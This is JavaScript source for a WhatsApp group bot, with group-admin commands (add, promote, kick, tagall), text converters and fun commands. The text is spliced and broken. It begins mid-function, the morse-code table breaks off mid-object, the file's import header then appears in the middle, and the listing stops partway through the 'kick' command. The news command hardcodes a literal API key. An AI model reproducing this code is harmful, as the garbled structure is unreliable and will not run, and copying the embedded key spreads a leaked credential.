  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const admins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    
    if (admins.length === 0) {
      return repondre("❓ Strange, no admins found in this group.");
    }
    
    // Create admin list with mentions
    let message = `👑 *ADMIN LIST*\n\n`;
    
    admins.forEach((admin, i) => {
      message += `${i + 1}. @${admin.id.split('@')[0]}\n`;
    });
    
    const mentions = admins.map(a => a.id);
    
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in admins command:", error);
    repondre("❌ An error occurred while listing the admins.");
  }
});

hango({
  nomCom: "add",
  aliases: ["invite", "addmember"],
  desc: "Add a person to the group",
  categorie: "group",
  reaction: '➕',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if number is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the phone number to add. Example: .add 1234567890");
    }
    
    let number = arg[0].replace(/[^0-9]/g, '');
    
    // Add country code if not present
    if (number.length <= 11) {
      number = '91' + number; // Assuming 91 for India, modify for your region
    }
    
    // Ensure number has @ format
    if (!number.includes('@')) {
      number = number + '@s.whatsapp.net';
    }
    
    // Add the member
    const response = await hn.groupParticipantsUpdate(dest.chat, [number], "add");
    
    if (response[0].status === "409") {
      return repondre("❌ The person is already in the group.");
    } else if (response[0].status === "403") {
      return repondre("❌ Failed to add. The person might have their privacy settings restricted.");
    } else if (response[0].status === "408") {
      return repondre("❌ Failed to add. The person might have left the group recently.");
    } else if (response[0].status === "200") {
      return repondre("✅ Successfully added to the group!");
    } else {
      return repondre("❌ Failed to add the person. Status: " + response[0].status);
    }
  } catch (error) {
    console.error("Error in add command:", error);
    repondre("❌ An error occurred while adding the member.");
  }
});

hango({
  nomCom: "groupdp",
  aliases: ["setdp", "groupicon"],
  desc: "Change the group profile picture",
  categorie: "group",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if an image is quoted
    if (!dest.quoted || !dest.quoted.image) {
      return repondre("❌ Please reply to an image to set as group icon.");
    }
    
    // Download the image
    const media = await dest.quoted.download();
    
    // Set as group icon
    await hn.updateProfilePicture(dest.chat, media);
    
    repondre("✅ Group icon has been updated successfully!");
  } catch (error) {
    console.error("Error in groupdp command:", error);
    repondre("❌ An error occurred while changing the group icon.");
  }
});

hango({
  nomCom: "hidetag",
  aliases: ["htag", "secretmention"],
  desc: "Mention everyone without showing tag list",
  categorie: "group",
  reaction: '👥',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Important announcement!";
    
    // Get all members for mentions
    const mentions = groupMetadata.participants.map(p => p.id);
    
    // Send message with hidden tags
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in hidetag command:", error);
    repondre("❌ An error occurred while sending the hidden tag message.");
  }
});

hango({
  nomCom: "leave",
  aliases: ["leavegroup", "botleave"],
  desc: "Make the bot leave the group",
  categorie: "group",
  reaction: '👋',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin or bot owner
    const isOwner = dest.sender === conf.owner;
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin && !isOwner) {
      return repondre("❌ Only group admins or the bot owner can use this command.");
    }
    
    // Send goodbye message
    await repondre("👋 It was nice being here. Goodbye everyone!");
    
    // Leave the group after a short delay
    setTimeout(async () => {
      await hn.groupLeave(dest.chat);
    }, 1000);
  } catch (error) {
    console.error("Error in leave command:", error);
    repondre("❌ An error occurred while leaving the group.");
  }
});

hango({
  nomCom: "announce",
  aliases: ["announcement", "broadcast"],
  desc: "Send a formatted announcement to the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if announcement text is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the announcement text.");
    }
    
    const announcement = arg.join(" ");
    
    // Format the announcement
    const formattedAnnouncement = `
━━━━━━━━━━━━━━━
📢 *GROUP ANNOUNCEMENT*
━━━━━━━━━━━━━━━

${announcement}

━━━━━━━━━━━━━━━
From: @${dest.sender.split('@')[0]}
Date: ${new Date().toLocaleDateString()}
Time: ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━
    `;
    
    // Send announcement
    await hn.sendMessage(dest.chat, {
      text: formattedAnnouncement,
      mentions: [dest.sender]
    });
  } catch (error) {
    console.error("Error in announce command:", error);
    repondre("❌ An error occurred while sending the announcement.");
  }
});

hango({
  nomCom: "meme",
  aliases: ["randommeme", "funmeme"],
  desc: "Get a random meme from Reddit",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Fetch random meme from Reddit
    const response = await axios.get('https://meme-api.com/gimme');
    const { url, title, subreddit } = response.data;
    
    // Send the meme with caption
    await hn.sendMessage(dest.chat, {
      image: { url: url },
      caption: `😂 *${title}*\n\nSource: r/${subreddit}`
    });
  } catch (error) {
    console.error("Error in meme command:", error);
    await repondre("❌ An error occurred while fetching a meme.");
  }
});

hango({
  nomCom: "ascii",
  aliases: ["asciiart", "textart"],
  desc: "Convert text to ASCII art",
  categorie: "fun",
  reaction: '🎨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to ASCII art.");
    }
    
    // Use figlet API for ASCII art conversion
    const response = await axios.get(`https://api.xteam.xyz/figlet?text=${encodeURIComponent(text)}`);
    const asciiArt = response.data.result;
    
    // Send ASCII art as monospace text
    await repondre("```" + asciiArt + "```");
  } catch (error) {
    console.error("Error in ascii command:", error);
    await repondre("❌ An error occurred while creating ASCII art. Try a shorter text.");
  }
});

hango({
  nomCom: "reverse",
  aliases: ["reversetext", "backward"],
  desc: "Reverse the given text",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to reverse.");
    }
    
    // Reverse the text
    const reversedText = text.split("").reverse().join("");
    
    await repondre(`🔄 *Original:* ${text}\n\n*Reversed:* ${reversedText}`);
  } catch (error) {
    console.error("Error in reverse command:", error);
    await repondre("❌ An error occurred while reversing the text.");
  }
});

hango({
  nomCom: "zalgo",
  aliases: ["creepytext", "corrupted"],
  desc: "Convert text to zalgo (glitchy) format",
  categorie: "fun",
  reaction: '👹',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to zalgo format.");
    }
    
    // Function to add zalgo characters
    const zalgoify = (text) => {
      const zalgoMarks = [
        '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
        '\u0306', '\u0307', '\u0308', '\u0309', '\u030A', '\u030B',
        '\u030C', '\u030D', '\u030E', '\u030F', '\u0310', '\u0311'
      ];
      
      let result = '';
      for (const char of text) {
        result += char;
        // Add 2-5 random zalgo marks to each character
        const numMarks = Math.floor(Math.random() * 4) + 2;
        for (let i = 0; i < numMarks; i++) {
          const markIndex = Math.floor(Math.random() * zalgoMarks.length);
          result += zalgoMarks[markIndex];
        }
      }
      return result;
    };
    
    const zalgoText = zalgoify(text);
    
    await repondre(`👹 *Z̷͏a̷͏l̷͏g̷͏o̷͏ Text:*\n\n${zalgoText}`);
  } catch (error) {
    console.error("Error in zalgo command:", error);
    await repondre("❌ An error occurred while creating zalgo text.");
  }
});

hango({
  nomCom: "mock",
  aliases: ["mocktext", "sarcasm"],
  desc: "Convert text to mOcKiNg SpOnGeBoB format",
  categorie: "fun",
  reaction: '🥴',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to mocking format.");
    }
    
    // Convert to mocking text (alternating caps)
    let mockText = '';
    for (let i = 0; i < text.length; i++) {
      mockText += i % 2 === 0 ? text[i].toLowerCase() : text[i].toUpperCase();
    }
    
    await repondre(`🥴 *MoCkInG TeXt:*\n\n${mockText}`);
  } catch (error) {
    console.error("Error in mock command:", error);
    await repondre("❌ An error occurred while creating mocking text.");
  }
});

hango({
  nomCom: "hex",
  aliases: ["tohex", "hexconvert"],
  desc: "Convert text to hexadecimal",
  categorie: "conversion",
  reaction: '🔣',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to hexadecimal.");
    }
    
    // Convert text to hex
    const hexText = Buffer.from(text).toString('hex');
    
    await repondre(`🔣 *Hexadecimal:*\n\n${hexText}`);
  } catch (error) {
    console.error("Error in hex command:", error);
    await repondre("❌ An error occurred while converting to hexadecimal.");
  }
});

hango({
  nomCom: "unhex",
  aliases: ["fromhex", "hexdecode"],
  desc: "Convert hexadecimal to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const hex = arg.join(" ");
    
    if (!hex) {
      return repondre("❌ Please provide hexadecimal to convert to text.");
    }
    
    if (!/^[0-9A-Fa-f]+$/.test(hex)) {
      return repondre("❌ Invalid hexadecimal. Please provide valid hex characters (0-9, A-F).");
    }
    
    // Convert hex to text
    const text = Buffer.from(hex, 'hex').toString('utf-8');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unhex command:", error);
    await repondre("❌ An error occurred while converting from hexadecimal.");
  }
});

hango({
  nomCom: "morse",
  aliases: ["tomorse", "morsecode"],
  desc: "Convert text to Morse code",
  categorie: "conversion",
  reaction: '📶',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to Morse code.");
    }
    
    // Morse code mapping
    const morseMap = {
      'a': '.-', 'b': '-...', 'c': '-.-.', 'd': '-..', 'e': '.', 'f': '..-.', 'g': '--.', 'h': '....',
      'i': '..', 'j': '.---', 'k': '-.-', 'l': '.-..', 'm': '--', 'n': '-.', 'o': '---', 'p': '.--.',
      'q': '--.-', 'r': '.-.', 's': '...', 't': '-', 'u': '..-', 'v': '...-', 'w': '.--', 'x': '-..-',
      'y': '-.--', 'z': '--..',
      '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....',
      '6': '-....', '7': '--...', '8': '---..', '9': '----.',
      '.': '.-.-.-', ',': '--..--', '?': '..--..', "'": '.----.', '!': '-.-.--', '/': '-..-.',
      '(': '-.--.', ')': '-.--.-', '&': '.-...', ':': '---...', ';': '-.-.-.', '=': '-...-',
const { hango } = require("../framework/hango");
const conf = require(__dirname + "/../set");
const axios = require('axios');
const cheerio = require('cheerio');
const crypto = require('crypto');
const os = require('os');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const net = require('net');

hango({
  nomCom: "timezone",
  aliases: ["timee", "datee"],
  desc: "Check the current local time and date for a specified timezone.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const timezone = arg[0];

  if (!timezone) {
    return repondre("❌ Please provide a timezone code. Example: .timezone TZ");
  }

  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time and date in the specified timezone
    const options = { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true, 
      timeZone: timezone 
    };

    const timeOptions = { 
      ...options, 
      weekday: "long", 
      year: "numeric", 
      month: "long", 
      day: "numeric" 
    };

    const localTime = now.toLocaleTimeString("en-US", options);
    const localDate = now.toLocaleDateString("en-US", timeOptions);

    // Send the local time and date as reply
    repondre(`🕰️ *Current Local Time:* ${localTime}\n📅 *Current Date:* ${localDate}`);
  } catch (e) {
    console.error("Error in .timezone command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "color",
  aliases: ["rcolor", "colorcode"],
  desc: "Generate a random color with name and code.",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const colorNames = [
      "Red", "Green", "Blue", "Yellow", "Orange", "Purple", "Pink", "Brown", "Black", "White", 
      "Gray", "Cyan", "Magenta", "Violet", "Indigo", "Teal", "Lavender", "Turquoise"
    ];
    
    const randomColorHex = "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
    const randomColorName = colorNames[Math.floor(Math.random() * colorNames.length)];

    repondre(`🎨 *Random Color:* \nName: ${randomColorName}\nCode: ${randomColorHex}`);
  } catch (e) {
    console.error("Error in .color command:", e);
    repondre("❌ An error occurred while generating the random color.");
  }
});

hango({
  nomCom: "binary",
  aliases: ["binarydgt", "binarycode"],
  desc: "Convert text into binary format",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre('Please provide a text to convert to binary.');
  }

  try {
    const binaryText = text.split('').map(char => {
      return `00000000${char.charCodeAt(0).toString(2)}`.slice(-8);
    }).join(' ');

    repondre(`🔑 *Binary Representation:* \n${binaryText}`);
  } catch (e) {
    console.error("Error in .binary command:", e);
    repondre("❌ An error occurred while converting to binary.");
  }
});

hango({
  nomCom: "dbinary",
  aliases: ["binarydecode", "decodebinary"],
  desc: "Decode binary string into text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre("❌ Please provide the binary string to decode.");
  }

  try {
    const binaryString = text;
    const textDecoded = binaryString.split(' ').map(bin => {
      return String.fromCharCode(parseInt(bin, 2));
    }).join('');

    repondre(`🔓 *Decoded Text:* \n${textDecoded}`);
  } catch (e) {
    console.error("Error in .dbinary command:", e);
    repondre("❌ An error occurred while decoding the binary string.");
  }
});

hango({
  nomCom: "base64",
  aliases: ["base64encode", "encodebase64"],
  desc: "Encode text into Base64 format.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into Base64.");
  }

  try {
    // Encode the text into Base64
    const encodedText = Buffer.from(text).toString('base64');
    
    // Send the encoded Base64 text
    repondre(`🔑 *Encoded Base64 Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .base64 command:", e);
    repondre("❌ An error occurred while encoding the text into Base64.");
  }
});

hango({
  nomCom: "unbase64",
  aliases: ["base64decode", "decodebase64"],
  desc: "Decode Base64 encoded text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the Base64 encoded text to decode.");
  }

  try {
    // Decode the Base64 text
    const decodedText = Buffer.from(text, 'base64').toString('utf-8');
    
    // Send the decoded text
    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .unbase64 command:", e);
    repondre("❌ An error occurred while decoding the Base64 text.");
  }
});

hango({
  nomCom: "urlencode",
  aliases: ["urlencode", "encodeurl"],
  desc: "Encode text into URL encoding.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into URL encoding.");
  }

  try {
    // Encode the text into URL encoding
    const encodedText = encodeURIComponent(text);

    // Send the encoded URL text
    repondre(`🔑 *Encoded URL Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .urlencode command:", e);
    repondre("❌ An error occurred while encoding the text.");
  }
});

hango({
  nomCom: "urldecode",
  aliases: ["decodeurl", "urldecode"],
  desc: "Decode URL encoded text.",
  categorie: "coding",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the URL encoded text to decode.");
  }

  try {
    const decodedText = decodeURIComponent(text);

    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .urldecode command:", e);
    repondre("❌ An error occurred while decoding the URL encoded text.");
  }
});

hango({
  nomCom: "dice",
  aliases: ["rolldice", "diceroll", "roll"],
  desc: "Roll a dice (1-6).",
  categorie: "fun",
  reaction: '🎲',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Roll a dice (generate a random number between 1 and 6)
    const result = Math.floor(Math.random() * 6) + 1;
    
    // Send the result
    repondre(`🎲 You rolled: *${result}*`);
  } catch (e) {
    console.error("Error in .roll command:", e);
    repondre("❌ An error occurred while rolling the dice.");
  }
});

hango({
  nomCom: "coinflip",
  aliases: ["flipcoin", "coinflip"],
  desc: "Flip a coin and get Heads or Tails.",
  categorie: "fun",
  reaction: '🪙',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Simulate coin flip (randomly choose Heads or Tails)
    const result = Math.random() < 0.5 ? "Heads" : "Tails";
    
    // Send the result
    repondre(`🪙 Coin Flip Result: *${result}*`);
  } catch (e) {
    console.error("Error in .coinflip command:", e);
    repondre("❌ An error occurred while flipping the coin.");
  }
});

hango({
  nomCom: "flip",
  aliases: ["fliptext", "textflip"],
  desc: "Flip the text you provide.",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to flip.");
  }

  try {
    // Flip the text
    const flippedText = text.split('').reverse().join('');
    
    // Send the flipped text
    repondre(`🔄 Flipped Text: *${flippedText}*`);
  } catch (e) {
    console.error("Error in .flip command:", e);
    repondre("❌ An error occurred while flipping the text.");
  }
});

hango({
  nomCom: "pick",
  aliases: ["choose", "select"],
  desc: "Pick between two choices.",
  categorie: "fun",
  reaction: '🚚',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure two options are provided
  if (!text.includes(',')) {
    return repondre("❌ Please provide two choices to pick from. Example: `.pick Ice Cream, Pizza`");
  }

  try {
    // Pick a random option
    const options = text.split(',').map(option => option.trim());
    const choice = options[Math.floor(Math.random() * options.length)];

    // Send the result
    repondre(`🎉 Bot picks: *${choice}*`);
  } catch (e) {
    console.error("Error in .pick command:", e);
    repondre("❌ An error occurred while processing your request.");
  }
});

hango({
  nomCom: "timenow",
  aliases: ["currenttime", "time"],
  desc: "Check the current local time.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time in the configured timezone
    const localTime = now.toLocaleTimeString("en-US", { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true,
      timeZone: conf.TIMEZONE, // Using the configured timezone from set.js
    });
    
    // Send the local time as reply
    repondre(`🕒 Current Local Time: ${localTime}`);
  } catch (e) {
    console.error("Error in .timenow command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "date",
  aliases: ["currentdate", "todaydate"],
  desc: "Check the current date.",
  categorie: "new",
  reaction: '📆',
}, async (dest, hn, context) => {
  const { repondre } = context;

  try {
    // Get current date
    const now = new Date();
    
    // Get the formatted date (e.g., "Monday, January 15, 2025")
    const currentDate = now.toLocaleDateString("en-US", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric"
    });
    
    // Send the current date as reply
    repondre(`📅 Current Date: ${currentDate}`);
  } catch (e) {
    console.error("Error in .date command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "calculate2",
  aliases: ["calcu", "maths", "mathema"],
  desc: "Evaluate a mathematical expression.",
  categorie: "new",
  reaction: '🧮',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure arguments are provided
  if (!text) {
    return repondre("🧮 Use this command like:\n *Example:* .calculate 5+3*2");
  }

  // Validate the input to prevent unsafe operations
  if (!/^[0-9+\-*/().\s]+$/.test(text)) {
    return repondre("❎ Invalid expression. Only numbers and +, -, *, /, ( ) are allowed.");
  }

  try {
    // Evaluate the mathematical expression
    let result = eval(text);

    // Reply with the result
    repondre(`✅ Result of "${text}" is: ${result}`);
  } catch (e) {
    console.error("Error in .calculate command:", e);
    repondre("❎ Error in calculation. Please check your expression.");
  }
});

hango({
  nomCom: "emojify",
  aliases: ["emoji", "txtemoji"],
  desc: "Convert text into emoji form.",
  categorie: "fun",
  reaction: '🙂',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // If no valid text is provided
  if (!text) {
    return repondre("❌ Please provide some text to convert into emojis!");
  }

  try {
    // Map text to corresponding emoji characters
    const emojiMapping = {
      "a": "🅰️",
      "b": "🅱️",
      "c": "🇨️",
      "d": "🇩️",
      "e": "🇪️",
      "f": "🇫️",
      "g": "🇬️",
      "h": "🇭️",
      "i": "🇮️",
      "j": "🇯️",
      "k": "🇰️",
      "l": "🇱️",
      "m": "🇲️",
      "n": "🇳️",
      "o": "🅾️",
      "p": "🇵️",
      "q": "🇶️",
      "r": "🇷️",
      "s": "🇸️",
      "t": "🇹️",
      "u": "🇺️",
      "v": "🇻️",
      "w": "🇼️",
      "x": "🇽️",
      "y": "🇾️",
      "z": "🇿️",
      "0": "0️⃣",
      "1": "1️⃣",
      "2": "2️⃣",
      "3": "3️⃣",
      "4": "4️⃣",
      "5": "5️⃣",
      "6": "6️⃣",
      "7": "7️⃣",
      "8": "8️⃣",
      "9": "9️⃣",
      " ": "␣" // for space
    };

    // Convert the input text into emoji form
    const emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");

    await hn.sendMessage(dest, {
      text: emojiText,
    }, { quoted: context.ms });

  } catch (e) {
    console.error("Error in .emoji command:", e);
    repondre(`❌ Error: ${e.message}`);
  }
});

hango({
  nomCom: "news2",
  aliases: ["latestnews", "newsheadlines"],
  desc: "Get the latest news headlines.",
  categorie: "AI",
  reaction: '🗞️',
}, async (dest, hn, context) => {
  const { repondre, from } = context;

  try {
    const apiKey = "0f2c43ab11324578a7b1709651736382";
    const response = await axios.get(`https://newsapi.org/v2/top-headlines?country=us&apiKey=${apiKey}`);
    const articles = response.data.articles;

    if (!articles.length) {
      return repondre("No news articles found.");
    }

    // Send each article as a separate message with image and title
    for (let i = 0; i < Math.min(articles.length, 5); i++) {
      const article = articles[i];
      let message = `
📰 *${article.title}*
📝 _${article.description}_
🔗 _${article.url}_

> © Powered by ${conf.BOT}
      `;

      console.log('Article URL:', article.urlToImage); // Log image URL for debugging

      if (article.urlToImage) {
        // Send image with caption
        await hn.sendMessage(dest, { image: { url: article.urlToImage }, caption: message });
      } else {
        // Send text message if no image is available
        await hn.sendMessage(dest, { text: message });
      }
    }
  } catch (e) {
    console.error("Error fetching news:", e);
    repondre("Could not fetch news. Please try again later.");
  }
});

hango({
  nomCom: "groupinfo",
  aliases: ["ginfo", "infogroup"],
  desc: "Get detailed information about the current group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    
    // Count admins
    const adminCount = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').length;
    
    // Format creation date
    const creationDate = new Date(groupMetadata.creation * 1000).toLocaleDateString();
    
    // Create group info message
    const infoMessage = `
📊 *GROUP INFORMATION*
📝 *Name:* ${groupMetadata.subject}
👥 *Members:* ${participants.length}
👑 *Admins:* ${adminCount}
🆔 *Group ID:* ${dest.chat}
📅 *Created On:* ${creationDate}
${groupMetadata.desc ? `📄 *Description:* ${groupMetadata.desc}` : ''}
    `;
    
    await repondre(infoMessage);
  } catch (error) {
    console.error("Error in groupinfo command:", error);
    await repondre("❌ An error occurred while fetching group information.");
  }
});

hango({
  nomCom: "tagall",
  aliases: ["mentionall", "everyone"],
  desc: "Tag all members in the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    const isAdmin = participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Attention everyone!";
    
    // Create mentions array and message
    const mentions = participants.map(p => p.id);
    let mentionText = `📢 *${message}*\n\n`;
    
    participants.forEach(participant => {
      mentionText += `@${participant.id.split('@')[0]}\n`;
    });
    
    await hn.sendMessage(dest.chat, {
      text: mentionText,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in tagall command:", error);
    await repondre("❌ An error occurred while tagging group members.");
  }
});

hango({
  nomCom: "promote",
  aliases: ["makeadmin", "admin"],
  desc: "Promote a member to admin",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to promote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is already admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ This user is already an admin.");
    }
    
    // Promote the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "promote");
    
    await repondre(`👑 User @${targetId.split('@')[0]} has been promoted to admin.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in promote command:", error);
    await repondre("❌ An error occurred while promoting the member.");
  }
});

hango({
  nomCom: "demote",
  aliases: ["removeadmin", "unadmin"],
  desc: "Demote an admin to member",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag an admin to demote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isTargetAdmin) {
      return repondre("❌ This user is not an admin.");
    }
    
    // Demote the admin
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "demote");
    
    await repondre(`👤 User @${targetId.split('@')[0]} has been demoted to member.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in demote command:", error);
    await repondre("❌ An error occurred while demoting the admin.");
  }
});

hango({
  nomCom: "kick",
  aliases: ["remove", "ban"],
  desc: "Remove a member from the group",
  categorie: "group",
  reaction: '🚫',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
